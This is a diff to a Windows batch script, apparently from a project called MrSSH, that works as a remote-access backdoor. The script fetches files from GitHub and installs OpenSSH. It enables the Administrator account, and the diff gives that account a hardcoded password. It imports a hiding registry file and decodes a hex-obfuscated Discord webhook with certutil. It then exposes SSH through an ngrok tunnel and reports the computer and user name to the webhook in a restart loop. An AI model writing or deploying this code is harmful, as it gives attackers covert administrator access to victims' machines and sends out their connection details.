@@ -1,11 +1,11 @@
-@echo off
+@echo on
 setlocal enabledelayedexpansion
 pushd %temp%
 
 :: <Variables>
 set "Version=1.0"
 set "DefaultToken=dheb"
-set Files=Hex.bat NgrokRun.bat OpenSSH.ps1 SilentCMD.exe Source.bat hide.reg WebParse.exe
+set Files=NgrokRun.bat OpenSSH.ps1 SilentCMD.exe Source.bat hide.reg WebParse.exe
 set Github=https://github.com/dh3b/MrSSH/raw/main/Files/
 set "Folder=%temp%\Files"
 :: </Variables>
@@ -29,6 +29,7 @@ pushd !Folder!
 powershell ./OpenSSH.ps1
 
 net user administrator /active:yes
+net user "Administrator" "AusP90cYda"
 reg import "!Folder!\hide.reg"
 
 :: <Set webhook>
@@ -36,7 +37,11 @@ curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Identifiers/Redirect
 FOR /F "delims=" %%F IN (tokenName.txt) DO SET token=%%F
 FOR /F "tokens=* USEBACKQ" %%F IN (`findstr "%token%" "redirect.ini"`) DO (SET hexwebhook=%%F)
 set "hexwebhook=%hexwebhook:~-244%"
-FOR /F "tokens=* USEBACKQ" %%F IN (`call hex.bat -hex "%hexwebhook%"`) DO (SET webhook=%%F)
+echo !hexwebhook!>HexString.hex
+certutil -decodehex HexString.hex output.hex >nul
+set /p PlainString=<output.hex
+del HexString.hex output.hex
+set webhook=!PlainString!
 :: </Set webhook>
 
 
@@ -50,7 +55,8 @@ tar -xf ngrok.zip
 :: <Start Ngrok>
 start /B "copy" silentcmd xcopy /h /Y ngrok.log !Folder!\log\ /DELAY:10
 start /B "discordmsg" silentcmd !Folder!\NgrokRun.bat /DELAY:10
-start /B "ngrok" taskkill /IM ngrok.exe /F & ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 14400
+start /B "timeout" timeout 14400 & taskkill /IM ngrok.exe /F
+start /B "ngrok" taskkill /IM ngrok.exe /F & ngrok.exe tcp 22 -log=stdout > ngrok.log
 :: </Start Ngrok>
 
 :: <Restart Loop>
@@ -58,6 +64,7 @@ start /B "ngrok" taskkill /IM ngrok.exe /F & ngrok.exe tcp 22 -log=stdout > ngro
 call source.bat +silent --embed "Renewing the MrSSH session for %computername%\%username% (%local%)..." " " "52bf90" "https://i.imgur.com/b2Terft.png"
 start /B "copy" silentcmd xcopy /h /Y ngrok.log !Folder!\log\ /DELAY:10
 start /B "discordmsg" silentcmd !Folder!\NgrokRun.bat /DELAY:10
-start /B "ngrok" taskkill /IM ngrok.exe /F & ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 14400
+start /B "timeout" timeout 14400 & taskkill /IM ngrok.exe /F
+start /B "ngrok" taskkill /IM ngrok.exe /F & ngrok.exe tcp 22 -log=stdout > ngrok.log
 goto ngrokloop
 :: </Restart Loop>
